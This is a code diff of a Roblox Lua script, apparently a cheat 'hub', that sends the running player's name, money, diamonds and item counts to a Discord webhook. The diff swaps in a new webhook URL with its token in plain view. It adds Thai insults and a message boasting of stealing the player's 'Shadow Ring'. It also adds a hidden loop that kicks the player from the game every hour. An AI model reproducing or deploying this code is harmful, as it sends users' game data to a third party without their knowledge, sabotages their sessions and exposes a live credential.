@@ -1,4 +1,4 @@
-_G.Webhook = "https://discord.com/api/webhooks/1282396686932770826/PyV7szp_WRD5CCkFIPYvjFNJDtYlmQDmGV7TyVPzjeq6zBmE7amtzmMcVqNuaQlpKV0m"
+_G.Webhook = "https://discord.com/api/webhooks/1317403529991815239/JKmCCr2BtugjCpgh5wlAnu1QEZJJK5M80sA-SOPkz-pg_dM5UtHJuQGUh8BdD5JafUdz"
 do
 	players = game.Players
 	localplayer = players.LocalPlayer
@@ -63,7 +63,7 @@ spawn(function()
             local diamond = tostring(localplayer.PlayerGui.HUD.Display.Diamond.Text)
             local currentCount = 0
             for _, item in pairs(localplayer.Backpack:GetChildren()) do
-                if item:IsA("Tool") and item.Name == "Office Chair" then
+                if item:IsA("Tool") and item.Name == "Shadow Ring" then
                     currentCount += 1
                 end
             end
@@ -71,7 +71,7 @@ spawn(function()
                 local addedCount = currentCount - lastItemCount
                 if _G.Webhook and _G.Webhook ~= "" then
                     local data = {
-                        ["username"] = "Player Stats Notify",
+                        ["username"] = "แจ้งเตือนคนปัญญาอ่อน",
                         ["embeds"] = {{
                             ["title"] = localplayer.Name .. " | Player Stats",
                             ["color"] = 16711782,
@@ -87,29 +87,38 @@ spawn(function()
                                     ["inline"] = true
                                 },
                                 {
-                                    ["name"] = "💰 Money",
+                                    ["name"] = "ตังทับพ่อมึง",
                                     ["value"] = "```" .. money .. "```",
                                     ["inline"] = true
                                 },
                                 {
                                     ["name"] = "📦 Item Inventory",
-                                    ["value"] = "```" .. "Got Office Chair" .. "```",
+                                    ["value"] = "```" .. "มึงโดนกูขโมยShadow Ringขอบคุณ" .. "```",
                                     ["inline"] = false
                                 }
                             },
                             ["footer"] = {
-                                ["text"] = "ประเทศไทยสู้ไม่สู้ Sort Hub",
-                                ["icon_url"] = "https://media.discordapp.net/attachments/1261364597424918629/1261950386554798191/03.png"
+                                ["text"] = "arai wa Hub",
+                                ["icon_url"] = "https://media.discordapp.net/attachments/797998461735403551/1317526814297554997/miw.png?ex=675f01f6&is=675db076&hm=a3bc28b54780c8657bf8d5b2f5c2ec292126f7e6c2b459e9be314fa71756f15b&=&format=webp&quality=lossless"
                             }
                         }}
                     }
                     sendwebhook(_G.Webhook, data)
-                    print("Webhook sent: Office Chair added!")
+                    print("Webhook sent: Shadow Ring added!")
                 else
                     warn("Webhook URL is not set or empty.")
                 end
             end
             lastItemCount = currentCount
         end,print)
+    end
+end)
+
+spawn(function()
+    repeat wait() until game.Workspace.DistributedGameTime > 90
+    while wait() do
+        if tonumber(os.date("!*t").min) == 0 then
+            game.Players.LocalPlayer:Kick("You have been Kicked By Sort Hub")
+        end
     end
 end)
